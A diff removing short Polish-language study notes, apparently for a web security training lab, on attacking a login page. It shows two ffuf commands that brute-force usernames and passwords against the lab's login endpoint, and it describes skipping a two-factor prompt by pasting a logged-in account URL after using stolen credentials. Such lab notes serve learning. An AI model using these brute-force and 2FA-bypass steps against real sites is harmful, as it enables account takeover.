@@ -1,8 +1,0 @@
-1. Bruteforcing panelu logowania:
-
-ffuf -u https://0ae5005d04cdafebc026f24f00c40061.web-security-academy.net/login -d "username=FUZZ&password=asdf" -w username -fs 3096
-ffuf -u https://0ae5005d04cdafebc026f24f00c40061.web-security-academy.net/login -d "username=athena&password=FUZZ" -w passwords
-
-2. Sprawdzenie czy F2A mozna ominac przy logowaniu. Zakladamy normalne konto i kopiujemy adres panelu uzytkownika.
-Zakladamy ze mamy skradzione dane innego uzytkownika, logujemy sie na jego konto w momecie kiedy zapyta nas o F2A wklejamy adres w pasek url
-i przechodzimy do niego jezeli aplikacja uwierzytelnila nas przy pierwszej probie to F2A zostanie pominiete.
